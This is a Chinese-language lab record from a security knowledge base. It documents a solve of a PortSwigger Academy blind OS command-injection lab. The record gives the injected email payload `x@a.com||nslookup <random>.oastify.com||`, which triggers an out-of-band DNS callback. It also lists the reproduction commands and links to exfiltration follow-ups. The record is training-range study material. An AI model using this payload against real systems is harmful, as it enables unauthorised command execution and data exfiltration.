---
title: "lab-blind-out-of-band"
links:
  - target: oob-callback-family
    relation: evidences
  - target: blind-injection-family
    relation: evidences
  - target: burp-collaborator-public-polling-method
    relation: evidences
---

# lab-blind-out-of-band

> evidences: [[oob-callback-family]], [[blind-injection-family]], [[burp-collaborator-public-polling-method]]

- 题面:Blind OS command injection with out-of-band interaction(/web-security/os-command-injection/lab-blind-out-of-band)
- 实例(批 53):https://0ad600b4045911648084626b008a00dc.web-security-academy.net
- slug(真):即请求 slug(lab_id 6E6E115E…)
- 判定目标:盲命令注入触发一次对 `*.oastify.com` 的 DNS 查询;状态:**solved**

## 判定机制(批 53 实证,推翻旧 blocked 判词)

- 载荷:`/feedback/submit` 的 `email` = `x@a.com||nslookup <随机串>.oastify.com||`;提交恒 200 `{}`(命令异步、无回显)。
- 8s 后横幅 `widgetcontainer-lab-status is-solved` + `Congratulations, you solved the lab!`。
- ⇒ **判定在「DNS 查询到达 oastify 权威」层**:随机编造子域(`b53p1a2b.oastify.com`)一发即解,不必持有该子域、不必有 Burp 客户端、不必读回交互。
- 旧结论(自建 OOB 域不可达)不变,只是被误读成"无解":**放行的回调面只有官方 Collaborator 域**,而该面本身足以翻检测型题。

## 复现命令

```
range_launch launch 6E6E115E1981AE822B7E41FCACCBC1CB96A5D85B63B42B80E3E6D35565209752 \
  --widget-source /web-security/os-command-injection --jar /tmp/b53-jar1.json
http_session get  "<inst>/feedback" --jar /tmp/b53-jar1.json --out /tmp/f.html      # 取 csrf
http_session post "<inst>/feedback/submit" --jar /tmp/b53-jar1.json --form csrf=<csrf> \
  --form name=t --form "email=x@a.com||nslookup b53p1a2b.oastify.com||" --form subject=s --form message=m
banner_verdict "<inst>/" --jar /tmp/b53-jar1.json          # solved=true
```

## 适用边界

- 只看「有没有 interaction」的**检测型** OOB 题:随机 `*.oastify.com` 子域一发即解。
- 要**读回外传数据**的题(用随机子域则数据埋在一个不可轮询的标签里),须换成自持 secret 派生的标签再轮询,见
  [[records/lab-blind-out-of-band-data-exfiltration]]、[[records/lab-out-of-band-data-exfiltration]]、
  [[records/lab-shellshock-exploitation]]。
